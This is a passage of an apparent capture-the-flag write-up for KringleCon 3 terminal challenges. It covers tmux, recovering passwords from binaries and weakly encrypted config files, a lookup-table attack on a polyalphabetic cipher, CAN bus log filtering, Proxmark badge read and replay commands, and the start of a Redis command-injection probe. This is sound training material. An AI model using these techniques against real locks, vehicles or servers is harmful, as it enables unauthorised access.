<p>Maybe you can help me configure my postfix mail server on <em>Gentoo</em>! Just kidding!</p>
<p>Hey, wouldja' mind helping me get into my point-of-sale terminal? It&rsquo;s down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up?<br />
<strong>Shinny</strong> says this might be an <em>Electron</em> application. I hear there&rsquo;s a way to extract an <em>ASAR</em> file from the binary, but I haven&rsquo;t looked into it yet.</p>
</div>
<div class="notices success" data-title="Objective 3 hints">
  <ul>
<li>Electron Applications - It&rsquo;s possible to extract the source code from an <a href="https://www.electronjs.org/">Electron</a> app.</li>
<li>Electron ASAR Extraction - There are <a href="https://www.npmjs.com/package/asar">tools</a> and <a href="https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37">guides</a> explaining how to extract ASAR from Electron apps.</li>
</ul>

</div>
<h3 id="3---unescapetmux">3 - Unescape Tmux</h3>
<hr />
<div class="box">[ELF] <strong>Pepper Minstix</strong> [LOCATION] <em>Castle Approach</em></div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi03_01.webp" alt="CranPi Terminal 3 location" data-caption="CranPi Terminal 3 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      CranPi Terminal 3 location
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Pepper Minstix:</strong><br />
Howdy - <strong>Pepper Minstix</strong> here!</p>
<p>I&rsquo;ve been playing with <code>tmux</code> lately, and golly it&rsquo;s useful. Problem is: I somehow became detached from my session. Do you think you could get me back to where I was, admiring a beautiful bird?</p>
<p>If you find it handy, there&rsquo;s a tmux cheat sheet you can use as a reference.<br />
I hope you can help!</p>
</div>
<div class="notices success" data-title="CranPi 3 hint">
  <ul>
<li>Tmux Cheat Sheet - There&rsquo;s a handy tmux reference available at <a href="https://tmuxcheatsheet.com/">https://tmuxcheatsheet.com/</a>!</li>
</ul>

</div>
<p>The terminal welcomes us with the following message:</p>
<div class="box">Can you help me?<br />
I was playing with my birdie (she&rsquo;s a Green Cheek!) in something called <strong>tmux</strong>,<br />
then I did something and it disappeared!<br />
Can you help me find her? We were so <strong>attach</strong>ed!!</div>
<p>We can start by listing the existing sessions with either <code>tmux ls</code> or <code>tmux list-sessions</code>. We get only one existing session:</p>
<div class="box">0: 1 windows (created Sat Dec 12 19:25:09 2020) [80x24]</div>
<p>We can attach to it with <code>tmux attach</code> to get our birdie back:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi03_02.webp" alt="tmux session 0" data-caption="tmux session 0" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      tmux session 0
      
        
        
      
    </figcaption>
  
</figure>
<p>Now that we solved <strong>Pepper</strong>&rsquo;s issue, he gives us a few hints to complete <a href="#4---operate-the-santavator">Objective 4</a>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Pepper Minstix:</strong><br />
You found her! Thanks so much for getting her back!</p>
<p>Hey, maybe I can help YOU out! There&rsquo;s a <em>Santavator</em> that moves visitors from floor to floor, but it&rsquo;s a bit wonky. You&rsquo;ll need a key and other odd objects. Try talking to <strong>Sparkle Redberry</strong> about the key.</p>
<p>For the odd objects, maybe just wander around the castle and see what you find on the floor. Once you have a few, try using them to split, redirect, and color the <em>Super Santavator Sparkle Stream</em> (<em>S4</em>). You need to power the red, yellow, and green receivers with the right color light!</p>
</div>
<div class="notices success" data-title="Objective 4 hints">
  <ul>
<li>Santavator Operations - It&rsquo;s really more art than science. The goal is to put the right colored light into the receivers on the left and top of the panel.</li>
</ul>

</div>
<h3 id="4---speaker-unprep">4 - Speaker UNprep</h3>
<hr />
<div class="box">[ELF] <strong>Bushy Evergreen</strong> [LOCATION] <em>Talks Lobby</em></div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi04_01.webp" alt="CranPi Terminal 4 location" data-caption="CranPi Terminal 4 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      CranPi Terminal 4 location
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Bushy Evergreen:</strong><br />
Ohai! <strong>Bushy Evergreen</strong>, just trying to get this door open.</p>
<p>It&rsquo;s running some <em>Rust</em> code written by <strong>Alabaster Snowball</strong>. I&rsquo;m pretty sure the password I need for <code>./door</code> is right in the executable itself. Isn&rsquo;t there a way to view the human-readable strings in a binary file?</p>
</div>
<p>We unlock the following hints:</p>
<div class="notices success" data-title="CranPi 4 hints">
  <ul>
<li>Strings in Binary Files - The strings command is common in Linux and available in Windows as part of SysInternals.</li>
<li>Letting a Program Decrypt for You - While you have to use the lights program in <code>/home/elf/</code> to turn the lights on, you can delete parts in <code>/home/elf/lab/</code>.</li>
<li>Lookup Table - For polyalphabetic ciphers, if you have control over inputs and visibility of outputs, lookup tables can save the day.</li>
</ul>

</div>
<p><strong>Bushy</strong> wants us to help him open the door of the <em>Speaker Unpreparedness Room</em> which is password protected. The terminal welcomes us with this message:</p>
<div class="box">Help us get into the Speaker Unpreparedness Room!<br />
The door is controlled by <code>./door</code>, but it needs a password! If you can figure out the password, it&rsquo;ll open the door right up!<br />
Oh, and if you have extra time, maybe you can turn on the lights with <code>./lights</code> activate the vending machines with <code>./vending-machines</code>? Those are a little trickier, they have configuration files, but it&rsquo;d help us a lot!<br />
(You can do one now and come back to do the others later if you want)<br />
We copied edit-able versions of everything into the <code>./lab/</code> folder, in case you want to try EDITING or REMOVING the configuration files to see how the binaries react.<br />
Note: These don&rsquo;t require low-level reverse engineering, so you can put away <em>IDA</em> and <em>Ghidra</em> (unless you WANT to use them!)</div>
<p>Let&rsquo;s start by running the <code>door</code> binary:</p>
<div class="box"><p>$ ./door<br />
You look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There&rsquo;s gotta be a tool for this&hellip;</p>
<p>What do you enter? &gt;</p>
</div>
<p>Let&rsquo;s look at the binary strings with <code>strings door | more</code>. We get pages and pages of strings but we find the password not far from the intro text:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi04_02.webp" alt="strings door | more" data-caption="strings door | more" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      strings door | more
      
        
        
      
    </figcaption>
  
</figure>
<p>The first goal is completed as we enter this password in the <code>door</code> binary. Next, the <code>lights</code> binary:</p>
<div class="box"><p>$ ./lights<br />
The speaker unpreparedness room sure is dark, you&rsquo;re thinking (assuming you&rsquo;ve opened the door; otherwise, you wonder how dark it actually is)</p>
<p>You wonder how to turn the lights on? If only you had some kind of hin&mdash;</p>
<p>&gt;&gt;&gt; CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf</p>
<p>&mdash;t to help figure out the password&hellip; I guess you&rsquo;ll just have to make do!</p>
<p>The terminal just blinks: Welcome back, elf-technician</p>
<p>What do you enter? &gt; 1234<br />
Beep boop invalid password</p>
</div>
<p>If we look at the <code>lights.conf</code> file, we see what seems an encrypted password and a username:</p>
<div class="box">$ cat lights.conf<br />
password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124<br />
name: elf-technician</div>
<p>Let&rsquo;s do some tests in the <code>lab</code> folder where we can play with the config files:</p>
<ol>
<li>if we rename the config file, we get the error <code>ERROR: Could not load /home/elf/lab/lights.conf</code>,</li>
<li>if we delete the password configuration, we get: <code>Password is missing from the config file!</code>,</li>
<li>if we replace the password with a blank one, we get <code>That would have turned on the lights!</code>. Good! However, we cannot edit the production config file :(</li>
</ol>
<p>If we talk again to <strong>Bushy</strong>, he gives us some other hint:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Bushy Evergreen:</strong><br />
That&rsquo;s it! What a great password…</p>
<p>Oh, this might be a good time to mention another lock in the castle. <strong>Santa</strong> asked me to ask you to evaluate the security of our new <em>HID</em> lock. If ever you find yourself in possession of a <em>Proxmark3</em>, click it in your badge to interact with it. It&rsquo;s a slick device that can read others' badges!</p>
<p>Hey, you want to help me figure out the light switch too? Those come in handy sometimes. The password we need is in the <code>lights.conf</code> file, but it seems to be encrypted.<br />
There&rsquo;s another instance of the program and configuration in <code>~/lab/</code> you can play around with. What if we set the user name to an encrypted value?</p>
</div>
<ol start="4">
<li>if we remove the <code>E$</code> suffix of the password, the application treats it as a clear-text password.</li>
</ol>
<p>Seems like the app decrypts all the configuration that starts with <code>E$</code>. What if we set an encrypted name? As the app displays the username, what if we set the password value as the name?</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi04_03.webp" alt="decrypted lights password" data-caption="decrypted lights password" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      decrypted lights password
      
        
        
      
    </figcaption>
  
</figure>
<p>It got decrypted! We run the production binary and enter the password to light on the <em>Speaker Unpreparedness Room</em>. Then <strong>Bushy</strong> adds:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Bushy Evergreen:</strong><br />
Wow - that worked? I mean, it worked! Hooray for opportunistic decryption, I guess!</p>
<p>Oh, did I mention that the <em>Proxmark</em> can simulate badges? Cool, huh? There are lots of references online to help. In fact, there&rsquo;s <a href="https://www.youtube.com/watch?v=647U85Phxgo">a talk</a> going on right now! </p>
<p>So hey, if you want, there&rsquo;s one more challenge. You see, there&rsquo;s a vending machine in there that the speakers like to use sometimes.<br />
Play around with <code>./vending_machines</code> in the <code>lab</code> folder.<br />
You know what might be worth trying? Delete or rename the config file and run it. Then you could set the password yourself to <code>AAAAAAAA</code> or <code>BBBBBBBB</code>. If the encryption is simple code book or rotation ciphers, you&rsquo;ll be able to roll back the original password.</p>
</div>
<p>The <code>./vending_machines</code> binary asks as well for a password. The configuration file looks like this:</p>
<div class="box">$ cat vending-machines.json<br />
{<br />
&ldquo;name&rdquo;: &ldquo;elf-maintenance&rdquo;,<br />
&ldquo;password&rdquo;: &ldquo;LVEdQPpBwr&rdquo;<br />
}</div>
<p>Let&rsquo;s play again with the <code>lab</code> version. If we delete the configuration file, we are asked to recreate it and to set our own username and password:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi04_05.webp" alt="set config file" data-caption="set config file" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      set config file
      
        
        
      
    </figcaption>
  
</figure>
<p>The password is encrypted and stored in the configuration file:</p>
<div class="box">{<br />
&ldquo;name&rdquo;: &ldquo;noob&rdquo;,<br />
&ldquo;password&rdquo;: &ldquo;XiGRehmwXiGRehmwXiGR&rdquo;<br />
}</div>
<p>We see a pattern in the ciphertext. It looks like polyalphabetic encryption with a key long 8 characters (the <code>A</code> is encrypted as <code>X</code> every 8 chars). For <code>BBBBBBBB</code> we get <code>DqTpKv7f</code>. If we do that for all the alphabet in use <code>[A-Za-z]</code>, we get the following lookup table:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi04_04.webp" alt="lookup table" data-caption="lookup table" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      lookup table
      
        
        
      
    </figcaption>
  
</figure>
<p>The first letter (row) of the cipher-text <code>L</code> corresponds to the letter <code>C</code> of the plaintext (column). The second letter is <code>V</code> -&gt; <code>a</code>&hellip;and so on. This gives us the password <code>CandyCane1</code> with which we can activate the vending machine! The last words of <strong>Bushy</strong> are:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Bushy Evergreen:</strong><br />
Your lookup table worked - great job! That&rsquo;s one way to defeat a polyalphabetic cipher!</p>
<p>Good luck navigating the rest of the castle.</p>
<p>And that <em>Proxmark</em> thing? Some people scan other people&rsquo;s badges and try those codes at locked doors. Other people scan one or two and just try to vary room numbers.<br />
Do whatever works best for you!</p>
</div>
<p>We unlock the hints to complete <a href="#5---open-hidlock">Objective 5</a>:</p>
<div class="notices success" data-title="Objective 5 hints">
  <ul>
<li>What&rsquo;s a Proxmark? - The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events.</li>
<li>Reading Badges with Proxmark - You can use a Proxmark to capture the facility code and ID value of HID ProxCard badge by running <code>lf hid read</code> when you are close enough to someone with a badge.</li>
<li>Impersonating Badges with Proxmark - You can also use a Proxmark to impersonate a badge to unlock a door, if the badge you impersonate has access. <code>lf hid sim -r 2006</code>&hellip;&hellip;</li>
<li>Short List of Essential Proxmark Commands - There&rsquo;s a <a href="https://gist.github.com/joswr1ght/efdb669d2f3feb018a22650ddc01f5f2">short list of essential Proxmark commands</a> also available.</li>
<li>Proxmark Talk - Larry Pesce knows a thing or two about <a href="https://www.youtube.com/watch?v=647U85Phxgo">HID attacks</a>. He&rsquo;s the author of a course on wireless hacking!</li>
</ul>

</div>
<h3 id="5---can-bus-investigation">5 - CAN-Bus Investigation</h3>
<hr />
<div class="box">[ELF] <strong>Wunorse Openslae</strong> [LOCATION] <em>Roof</em></div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi05_01.webp" alt="CranPi Terminal 5 location" data-caption="CranPi Terminal 5 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      CranPi Terminal 5 location
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Wunorse Openslae:</strong><br />
Hiya hiya - I&rsquo;m <strong>Wunorse Openslae</strong>! I&rsquo;ve been playing a bit with <em>CAN</em> bus. Are you a car hacker?</p>
<p>I&rsquo;d love it if you could take a look at this terminal for me. I&rsquo;m trying to figure out what the unlock code is in this <em>CAN</em> bus log. When it was grabbing this traffic, I locked, unlocked, and locked the doors one more time. It ought to be a simple matter of just filtering out the noise until we get down to those three actions.</p>
<p>Need more of a nudge? Check out <strong>Chris Elgee</strong>&rsquo;s talk on <em>CAN</em> traffic!</p>
</div>
<div class="notices success" data-title="CranPi 5 hints">
  <ul>
<li>Filtering Text - You can hide lines you don&rsquo;t want to see with commands like <code>cat file.txt | grep -v badstuff</code></li>
<li>Chris Elgee is talking about how <a href="https://www.youtube.com/watch?v=96u-uHRBI0I">CAN traffic</a> works right now!</li>
</ul>

</div>
<p>We are asked to filter data in a file dump and find when the <code>UNLOCK</code> command was triggered:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi05_02.webp" alt="CranPi Terminal 5 instructions" data-caption="CranPi Terminal 5 instructions" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      CranPi Terminal 5 instructions
      
        
        
      
    </figcaption>
  
</figure>
<p>The dump <code>candump.log</code> shows uncomprehensible information:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi05_03.webp" alt="more candump.log" data-caption="more candump.log" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      more candump.log
      
        
        
      
    </figcaption>
  
</figure>
<p>By watching <strong>Chris Elgee</strong>&rsquo;s <a href="https://www.youtube.com/watch?v=96u-uHRBI0I">talk</a>, we understand what a <em>CAN Bus</em> actually is. What we see in the last column of the dump is a <em>CAN</em> message that is composed of a <em>CAN ID</em> (3 chars) which represents a car component or action (i.e lock, brake, accelerate, etc.) followed by a data chunk that can indicate, for instance, if a lock opens/closes, or the value of the  acceleration/deceleration, etc. The <em>ID</em> and the data are separated by the delimiter <em>#</em>.</p>
<p>As per the instructions, we know that the door lock <em>CAN ID</em> must be present 3 times only, 2 <code>LOCK</code> and 1 <code>UNLOCK</code> message. Let&rsquo;s first count the number of unique <em>CAN ID</em>:</p>
<div class="box">$ cat candump.log | awk &lsquo;{print substr($3, 0, 4)}&rsquo; | sort | uniq -c<br />
35 188   <br />
3 19B<br />
1331 244</div>
<p>So it seems that the <em>ID</em> <code>19B</code> is our candidate! If we filter them, we get:</p>
<div class="box">$ cat candump.log | grep 19B#<br />
(1608926664.626448) vcan0 19B#000000000000 # LOCK<br />
(1608926671.122520) vcan0 19B#00000F000000 # UNLOCK<br />
(1608926674.092148) vcan0 19B#000000000000 # LOCK</div>
<p>We can now send our answer to validate the challenge:</p>
<div class="box">$ ./runtoanswer<br />
There are two LOCK codes and one UNLOCK code in the log.  What is the decimal portion of the UNLOCK timestamp?<br />
(e.g., if the timestamp of the UNLOCK were 1608926672.391456, you would enter 391456.<br />
&gt; 122520</div>
<p><strong>Wunorse</strong> seems still worried though:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Wunorse Openslae:</strong><br />
Great work! You found the code! I wonder if I can use this knowledge to work out some kind of universal unlocker … to be used only with permission, of course!</p>
<p>Say, do you have any thoughts on what might fix <strong>Santa</strong>&rsquo;s sleigh? Turns out: <strong>Santa</strong>&rsquo;s sleigh uses a variation of <em>CAN</em> bus that we call <em>CAN-D</em> bus. And there&rsquo;s something naughty going on in that <em>CAN-D</em> bus.</p>
<p>The brakes seem to shudder when I put some pressure on them, and the doors are acting oddly. I&rsquo;m pretty sure we need to filter out naughty <em>CAN-D-ID</em> codes. There might even be some valid <em>IDs</em> with invalid data bytes.</p>
<p>For security reasons, only <strong>Santa</strong> is allowed access to the sled and its <em>CAN-D</em> bus. I&rsquo;ll hit him up next time he&rsquo;s nearby.</p>
</div>
<p>We get a hint to complete <a href="#7---solve-the-sleighs-can-d-bus-problem">Objective 7</a>:</p>
<div class="notices success" data-title="Objective 7 hints">
  <ul>
<li>CAN ID Codes - Try filtering out one <em>CAN-ID</em> at a time and create a table of what each might pertain to. What&rsquo;s up with the brakes and doors?</li>
</ul>

</div>
<h3 id="6---redis-bughunt">6 - Redis Bug Hunt</h3>
<hr />
<div class="box">[ELF] <strong>Holly Evergreen</strong> [LOCATION] <em>Kitchen</em></div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi06_01.webp" alt="CranPi Terminal 6 location" data-caption="CranPi Terminal 6 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      CranPi Terminal 6 location
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Holly Evergreen:</strong><br />
Hi, so glad to see you! I&rsquo;m <strong>Holly Evergreen</strong>. I&rsquo;ve been working with this <em>Redis</em>-based terminal here.</p>
<p>We&rsquo;re quite sure there&rsquo;s a bug in it, but we haven&rsquo;t caught it yet. The maintenance port is available for <code>curl</code>ing, if you&rsquo;d like to investigate.</p>
<p>Can you check the source of the <code>index.php</code> page and look for the bug?<br />
I read something online recently about remote code execution on <em>Redis</em>. That might help! I think I got close to <em>RCE</em>, but I get mixed up between commas and plusses.</p>
<p>You&rsquo;ll figure it out, I&rsquo;m sure!</p>
</div>
<div class="notices success" data-title="CranPi 6 hints">
  <ul>
<li>Redis RCE - <a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">This</a> is kind of what we&rsquo;re trying to do&hellip;</li>
</ul>

</div>
<p>The terminal shows the following instructions:</p>
<div class="box">We need your help!! The server stopped working, all that&rsquo;s left is the maintenance port.<br />
To access it, run:<br />
curl http://localhost/maintenance.php<br />
We&rsquo;re pretty sure the bug is in the index page. Can you somehow use the maintenance page to view the source code for the index page?</div>
<p>Let&rsquo;s <code>curl</code> the page and see what happens:</p>
<div class="box">$ curl http://localhost/maintenance.php<br />
ERROR: &lsquo;cmd&rsquo; argument required (use commas to separate commands); eg:<br />
curl http://localhost/maintenance.php?cmd=help<br />
curl http://localhost/maintenance.php?cmd=mget,example1</div>
<p>We can run commands through the <code>cmd</code> variable. If we try the <code>help</code> command:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi06_02.webp" alt="redis help" data-caption="redis help" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      redis help
      
        
        
      
    </figcaption>
  
</figure>
<p>We see that our command is used as argument to <code>redis-cli</code> to show the <em>Redis</em> help. Let&rsquo;s try the <code>info</code> command to show some server information:</p>
<figure >
  
  
  
